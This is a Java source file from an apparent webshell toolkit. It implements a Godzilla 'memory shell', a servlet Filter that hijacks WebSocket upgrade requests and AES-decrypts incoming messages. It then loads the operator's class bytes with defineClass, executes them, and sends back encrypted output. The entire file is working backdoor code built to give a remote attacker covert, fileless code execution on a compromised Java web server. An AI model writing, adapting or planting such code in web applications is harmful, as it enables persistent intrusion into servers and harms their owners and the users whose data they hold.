package com.reajason.javaweb.memshell.shelltool.godzilla;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.lang.reflect.Method;
import java.nio.charset.Charset;

/**
 * 不依赖容器 WebSocket 实现的 Godzilla 内存马。
 * <p>
 * 继承 ClassLoader 用于直接 defineClass 客户端下发的 payload；握手与帧协议由注入器内置的
 * helper 接管连接器 socket，本类只处理加解密与 payload 调用。
 *
 * @author ReaJason
 */
public class GodzillaRawWebSocket extends ClassLoader implements Filter {

    private static final Charset UTF8 = Charset.forName("UTF-8");

    public static String key;

    private static Class<?> payload;
    private static Method sendBinaryMethod;

    private final Class<?> helperClass;

    public GodzillaRawWebSocket() {
        this(resolveHelperClass(GodzillaRawWebSocket.class));
    }

    public GodzillaRawWebSocket(ClassLoader parent) {
        super(parent);
        this.helperClass = null;
    }

    public GodzillaRawWebSocket(Class<?> helperClass) {
        this.helperClass = helperClass;
    }

    /**
     * 后缀必须与 RawWsHelperNames.HELPER_SUFFIX 一致；模板运行时不能依赖 api jar。
     */
    private static Class<?> resolveHelperClass(Class<?> shellClass) {
        try {
            return Class.forName(shellClass.getName() + "$RawWsHelper", false, shellClass.getClassLoader());
        } catch (Throwable ignored) {
            return null;
        }
    }

    @Override
    public void init(FilterConfig filterConfig) {
    }

    @Override
    public void destroy() {
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        if (!(request instanceof HttpServletRequest) || !(response instanceof HttpServletResponse)) {
            chain.doFilter(request, response);
            return;
        }
        HttpServletRequest httpRequest = (HttpServletRequest) request;
        String wsKey = httpRequest.getHeader("Sec-WebSocket-Key");
        if (wsKey == null || !"GET".equalsIgnoreCase(httpRequest.getMethod())) {
            chain.doFilter(request, response);
            return;
        }
        String version = httpRequest.getHeader("Sec-WebSocket-Version");
        if (version != null && !"13".equals(version.trim())) {
            HttpServletResponse httpResponse = (HttpServletResponse) response;
            httpResponse.setStatus(426);
            httpResponse.setHeader("Sec-WebSocket-Version", "13");
            return;
        }
        if (helperClass != null) {
            try {
                Object helper = helperClass.newInstance();
                if (helper.equals(new Object[]{request, response, this})) {
                    return;
                }
            } catch (Throwable ignored) {
            }
        }
        chain.doFilter(request, response);
    }

    public void onStart(Object helper) {
    }

    public void onReadBinary(Object helper, byte[] message) {
        byte[] result;
        try {
            byte[] data = x(message, false);
            if (payload == null || (data.length > 1 && data[0] == -54 && data[1] == -2)) {
                payload = new GodzillaRawWebSocket(Thread.currentThread().getContextClassLoader())
                        .defineClass(data, 0, data.length);
                result = "ok".getBytes(UTF8);
            } else {
                ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                Object f = payload.newInstance();
                f.equals(arrOut);
                f.equals(data);
                f.toString();
                result = arrOut.toByteArray();
            }
        } catch (Throwable e) {
            result = getErrorMessage(e).getBytes(UTF8);
        }
        try {
            sendBinary(helper, x(result, true));
        } catch (Throwable ignored) {
        }
    }

    public void onReadText(Object helper, String text) {
        onReadBinary(helper, text.getBytes(UTF8));
    }

    public void onDisconnect(Object helper) {
    }

    @SuppressWarnings("all")
    public Class<?> Q(byte[] cb) {
        return defineClass(cb, 0, cb.length);
    }

    public byte[] x(byte[] s, boolean m) throws Exception {
        Cipher c = Cipher.getInstance("AES");
        c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
        return c.doFinal(s);
    }

    private static void sendBinary(Object helper, byte[] data) {
        try {
            Method method = sendBinaryMethod;
            if (method == null) {
                method = helper.getClass().getMethod("sendBinary", byte[].class);
                sendBinaryMethod = method;
            }
            method.invoke(helper, data);
        } catch (Throwable ignored) {
        }
    }

    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
